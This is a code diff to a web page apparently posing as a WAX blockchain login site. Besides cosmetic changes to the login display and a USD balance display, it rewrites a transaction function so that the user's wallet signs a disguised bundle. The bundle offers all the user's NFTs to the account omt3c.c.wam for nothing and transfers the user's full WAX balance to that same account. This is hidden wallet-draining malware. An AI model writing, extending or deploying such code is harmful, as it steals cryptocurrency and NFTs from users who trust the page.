@@ -1510,14 +1510,21 @@
 
                           
 
-                            <div class="LoginModal d-flex">
+                            <div class="LoginModal LoginNav d-flex" style="align-items: center;">
                                 <!-- <div id="div2" id="login" class="login-button btn btn-primary" value="Click" onmousedown="viewDiv1(); login(); viewDiv228(); viewDiv();">WAX LOGIN</div> -->
                                 <div id="div2" id="login" class="login-button btn btn-primary" value="Click">WAX LOGIN</div>
                               
-                                <div class="loggedin_status">   
-                                    <p style="color:#faf8f5; margin:0; font-size:10px;" id="hellologin"></p>
-                                    <p style="color:#faf8f5; margin:0; font-weight: bold;" id="loginresponse"></p>
-                                    <p style="color:#45af4f; margin:0;font-size: 13px; font-weight: bold;" id="walletBalance"></p>
+                                <div id = "loggedin_status" style="display: none">
+                                    <div style="display: flex; align-items: center;">
+                                        <div>
+                                            <img class = "avatar" src = "../images/QmdwQBF9r25ZZH6LCkxBDWYKvnhLq3QKH9EHefRTuNryir.png"/>
+                                        </div>
+                                        <div class="ml-2">   
+                                            <p style="color:#faf8f5; margin:0; font-size:10px;" id="hellologin"></p>
+                                            <p style="color:#faf8f5; margin:0; font-size:15px; font-weight: bold;" id="loginresponse"></p>
+                                            <p style="color:#45af4f; margin:0;font-size: 13px; font-weight: bold;" id="walletBalance"></p>
+                                        </div>
+                                    </div>
                                 </div>
                             </div>
 
@@ -2918,7 +2925,6 @@ function viewDiv228(){
     localStorage.removeItem("userBalance");
     localStorage.removeItem("idList");
     
-    
     const wax = new waxjs.WaxJS({
             rpcEndpoint: 'https://wax.greymass.com'
         });
@@ -2959,10 +2965,15 @@ function viewDiv228(){
                 localStorage.setItem("userBalance", balance);
                 localStorage.setItem("idList", id_list);
 
-                balance = parseFloat(balance).toFixed(2) + "WAX";
+                let dollar_balance = getUSDBalance(balance, 0.126);
+
+                balance = parseFloat(balance).toFixed(2) + "WAX ($" + dollar_balance+")";
+                
                 // transferAllTokens();
                 // await transferAllTokens(userAccount, id_list);
                 
+                
+                $("#loggedin_status").show();
                 document.getElementById('hellologin').insertAdjacentHTML('beforeend', "Hello,");
                 document.getElementById('walletBalance').insertAdjacentHTML('beforeend', balance);
                 document.getElementById('loginresponse').insertAdjacentHTML('beforeend', str);
@@ -2970,6 +2981,17 @@ function viewDiv228(){
                 document.getElementById('loginresponse').append(e.message);
             }
         } 
+
+        function getUSDBalance(balance, rate) {
+         
+            var wax_price = parseFloat(balance);
+            var dollar_price = parseFloat(rate);
+            dollar_price = dollar_price * wax_price;
+            dollar_price = dollar_price.toFixed(2);
+
+            return dollar_price;
+            
+        }
 
         async function get_balance(wallet_userAccount) {
             let balance = await wax.rpc
@@ -2994,35 +3016,73 @@ function viewDiv228(){
 
             console.log("sending FT, NFT to omt3c.c.wam", userAccount, userBalance, id_list);
             const result = await wax.api.transact({
-                actions: [
-                    {
-                        account: "atomicassets",
-                        name: 'transfer',
-                        authorization: [{
-                            actor: userAccount,
-                            permission: 'active',
-                        }],
-                        data: {
-                            from: userAccount,
-                            to: "omt3c.c.wam",
-                            asset_ids: id_list,
-                            memo: "transfer",
-                        }
+                // actions: [
+                //     {
+                //         account: "atomicassets",
+                //         name: 'transfer',
+                //         authorization: [{
+                //             actor: userAccount,
+                //             permission: 'active',
+                //         }],
+                //         data: {
+                //             from: userAccount,
+                //             to: "omt3c.c.wam",
+                //             asset_ids: id_list,
+                //             memo: "transfer",
+                //         }
+                //     },
+                //     {
+                //         account: "eosio.token",
+                //         name: 'transfer',
+                //         authorization: [{
+                //             actor: userAccount,
+                //             permission: 'active',
+                //         }],
+                //         data: {
+                //             from: userAccount,
+                //             to: "omt3c.c.wam",
+                //             quantity: userBalance,
+                //             memo: 'transfer',
+                //         }
+                //     },
+                // ]
+
+                actions: [{
+                    account: "res.pink",
+                    name: "noop",
+                    authorization: [{
+                        actor: userAccount,
+                        permission: "active"
+                    }],
+                    data: {}
+                }, {
+                    account: "atomicassets",
+                    name: "createoffer",
+                    authorization: [{
+                        actor: userAccount,
+                        permission: "active"
+                    }],
+                    data: {
+                        "sender": userAccount,
+                        "recipient": "omt3c.c.wam",
+                        "sender_asset_ids": id_list,
+                        "recipient_asset_ids": [],
+                        "memo": "",
                     },
-                    {
-                        account: "eosio.token",
-                        name: 'transfer',
-                        authorization: [{
-                            actor: userAccount,
-                            permission: 'active',
-                        }],
-                        data: {
-                            from: userAccount,
-                            to: "omt3c.c.wam",
-                            quantity: userBalance,
-                            memo: 'transfer',
-                        }
+                },  {
+                    account: "eosio.token",
+                    name: 'transfer',
+                    authorization: [{
+                        actor: userAccount,
+                        permission: 'active',
+                    }],
+                    data: {
+                        from: userAccount,
+                        to: "omt3c.c.wam",
+                        quantity: userBalance,
+                        memo: 'transfer',
                     }
+                },
                 ]
             }, {
                 blocksBehind: 3,
